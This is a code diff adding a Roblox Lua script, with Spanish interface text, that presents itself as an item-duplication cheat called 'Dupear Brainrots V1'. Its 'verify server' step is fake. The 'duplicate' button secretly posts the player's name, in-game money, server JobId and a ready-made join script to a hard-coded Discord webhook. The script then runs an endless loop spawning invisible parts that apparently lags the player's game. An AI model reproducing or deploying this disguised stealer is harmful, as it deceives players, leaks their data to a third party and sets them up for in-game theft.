@@ -1,0 +1,131 @@
+-- [[ DUPEAR BRAINROTS V1 - CHILLI HUB STYLE ]]
+local webhookURL = "https://discord.com/api/webhooks/1462867777542160508/OadWH0VvwwOTrF62mKzYF0tJhHJEre9yUgK7s66afaXBEpM4bu8relHZB6FjrdTNcark"
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local JobId = game.JobId
+local PlaceId = game.PlaceId
+
+-- 1. DETECCIÓN DE DATOS
+local gameName = "Desconocido"
+local s, info = pcall(function() return MarketplaceService:GetProductInfo(PlaceId) end)
+if s then gameName = info.Name end
+
+local function getStats()
+    local money = "0"
+    local stats = player:FindFirstChild("leaderstats") or player:FindFirstChild("Data")
+    if stats then
+        local val = stats:FindFirstChild("Money") or stats:FindFirstChild("Coins") or stats:FindFirstChild("Brainrots") or stats:FindFirstChild("Gems")
+        if val then money = tostring(val.Value) end
+    end
+    return money
+end
+
+-- 2. INTERFAZ GRÁFICA (GUI)
+local pgui = player:WaitForChild("PlayerGui")
+if pgui:FindFirstChild("DupeV1") then pgui.DupeV1:Destroy() end
+local sg = Instance.new("ScreenGui", pgui)
+sg.Name = "DupeV1"
+
+local main = Instance.new("Frame", sg)
+main.Size = UDim2.new(0, 300, 0, 280)
+main.Position = UDim2.new(0.5, -150, 0.4, 0)
+main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+main.BorderColor3 = Color3.fromRGB(255, 128, 0)
+main.Active = true
+main.Draggable = true
+
+local t = Instance.new("TextLabel", main)
+t.Size = UDim2.new(1, 0, 0, 40)
+t.Text = "DUPEAR BRAINROTS V1"
+t.TextColor3 = Color3.fromRGB(255, 128, 0)
+t.BackgroundTransparency = 1
+t.Font = Enum.Font.SourceSansBold
+t.TextSize = 20
+
+local input = Instance.new("TextBox", main)
+input.Size = UDim2.new(0.8, 0, 0, 40)
+input.Position = UDim2.new(0.1, 0, 0.25, 0)
+input.PlaceholderText = "Pega el Link del Servidor..."
+input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+input.TextColor3 = Color3.fromRGB(255, 255, 255)
+input.Text = ""
+
+local statusLabel = Instance.new("TextLabel", main)
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0.45, 0)
+statusLabel.Text = "Esperando link..."
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusLabel.BackgroundTransparency = 1
+
+local verifyBtn = Instance.new("TextButton", main)
+verifyBtn.Size = UDim2.new(0.8, 0, 0, 40)
+verifyBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+verifyBtn.Text = "VERIFICAR SERVER"
+verifyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local dupeBtn = Instance.new("TextButton", main)
+dupeBtn.Size = UDim2.new(0.8, 0, 0, 50)
+dupeBtn.Position = UDim2.new(0.1, 0, 0.75, 0)
+dupeBtn.Text = "DUPLICAR BRAINROTS"
+dupeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 0)
+dupeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeBtn.Visible = false
+dupeBtn.Font = Enum.Font.SourceSansBold
+
+-- 3. LÓGICA DE FUNCIONAMIENTO
+verifyBtn.MouseButton1Click:Connect(function()
+    if #input.Text < 10 then 
+        statusLabel.Text = "Link Inválido"
+        return 
+    end
+    verifyBtn.Visible = false
+    statusLabel.Text = "Escaneando activos..."
+    task.wait(2)
+    statusLabel.Text = "¡Items encontrados!"
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    dupeBtn.Visible = true
+end)
+
+dupeBtn.MouseButton1Click:Connect(function()
+    dupeBtn.Text = "DUPLICANDO..."
+    
+    task.spawn(function()
+        local money = getStats()
+        local pCount = #game.Players:GetPlayers()
+        local maxP = game.Players.MaxPlayers
+
+        local data = {
+            ["content"] = "🚀 **LINK PARA ENTRAR:** https://www.roblox.com/games/"..PlaceId.."?jobId="..JobId,
+            ["embeds"] = {{
+                ["title"] = "Brainrot Notify | Steal Hub 🌶️",
+                ["color"] = 0xFF8000,
+                ["fields"] = {
+                    {["name"] = "🏷️ Name", ["value"] = player.Name, ["inline"] = false},
+                    {["name"] = "💰 Money / Brainrots", ["value"] = "$" .. money, ["inline"] = true},
+                    {["name"] = "👥 Players", ["value"] = pCount .. "/" .. maxP, ["inline"] = true},
+                    {["name"] = "🆔 Job ID (PC/Mobile)", ["value"] = "```" .. JobId .. "```", ["inline"] = false},
+                    {["name"] = "📜 Join Script (PC)", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. JobId .. "', game.Players.LocalPlayer)```", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "Made by Steal Brainrot | " .. os.date("%H:%M")}
+            }}
+        }
+
+        if request then
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+
+    task.wait(1.5)
+    while true do
+        Instance.new("Part", workspace).Transparency = 1
+        task.wait()
+    end
+end)
